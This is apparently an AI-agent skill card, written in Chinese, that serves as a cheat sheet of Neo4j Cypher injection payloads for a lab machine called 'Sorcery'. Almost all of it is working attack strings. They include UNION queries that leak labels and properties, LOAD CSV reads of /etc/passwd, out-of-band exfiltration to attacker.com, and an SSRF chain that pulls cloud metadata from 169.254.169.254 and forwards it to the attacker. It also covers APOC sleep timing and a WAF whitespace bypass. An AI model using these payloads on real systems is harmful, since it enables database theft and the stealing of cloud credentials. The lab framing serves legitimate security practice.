---
name: 'cypher-injection'
description: 'Neo4j Cypher Injection：UNION泄露/LOAD CSV SSRF/OOB外带/时间注入/WAF绕过。Sorcery靶机Step 1关键攻击面。'
disable-model-invocation: true
metadata: { domain: db, tier: T3 }
---
> 📌 DSH 用法：用 skill 工具按名加载本卡。

## Cypher Injection (Neo4j)

> Neo4j 的查询语言，和 SQLi 同构但语法不同。几乎所有 SQLi 的攻击类型在 Cypher 中都有对应。

### 检测注入点
任何可能拼进 Cypher 查询的用户输入：REST API 参数、登录表单、搜索框等。

### 基础 Payload

#### 简单闭合 + 条件绕过
```cypher
' OR 1=1 RETURN n//
```text
原始查询：`MATCH (n) WHERE n.name = '$input' RETURN n`

#### UNION 泄露标签
```cypher
' RETURN 1 AS x UNION CALL db.labels() YIELD label AS x RETURN x//
```text
泄露所有节点标签（相当于 SQL 的 `SELECT table_name FROM information_schema.tables`）

#### UNION 泄露属性名
```cypher
' RETURN 1 AS x UNION MATCH (n:TargetLabel) RETURN DISTINCT keys(n) AS x //
```text

#### UNION 泄露属性值
```cypher
' RETURN 1 AS x UNION MATCH (n:TargetLabel) RETURN n.targetProperty AS x //
```text

### LOAD CSV — SSRF / 文件读取
```cypher
' RETURN 1 AS x UNION LOAD CSV FROM 'http://attacker.com/' + x AS y RETURN ''//
```text

文件读取（如果 import 目录配置不当）：
```cypher
' RETURN 1 AS x UNION LOAD CSV FROM 'file:///etc/passwd' AS y RETURN ''//
```text

### LOAD CSV 外带数据（OOB）
```cypher
' CALL db.labels() YIELD label LOAD CSV FROM 'https://attacker.com/'+label AS r RETURN ''//
```text

### Sorcery Step 1 典型 Payload
```cypher
?name=Merlin'}) RETURN w UNION MATCH (n) WHERE n:Secret RETURN n //
```text
闭合 `{name: '$input'}` → 注入 UNION 读取 Secret 节点。

### 时间注入（需 APOC）
```cypher
' RETURN 1 AS x UNION CALL apoc.util.sleep(5000) RETURN 1 AS x //
```text

### 检测 APOC 是否安装
```cypher
CALL apoc.help('apoc')
```text

### WAF 绕过：空格过滤
```cypher
MATCH/**/(n)/**/RETURN/**/n
```text

### SSRF 链式外带
```cypher
LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/' AS x
LOAD CSV FROM 'https://attacker.com/'+x[0] AS y
RETURN ''//
```text
（先读内部端点 → 再外带到攻击者服务器）

### 工具
- **cypher-playground** (Docker): `git clone https://github.com/noypearl/cypher-playground.git && docker-compose up`
- Neo4j Browser: 本地测试 payload 语法
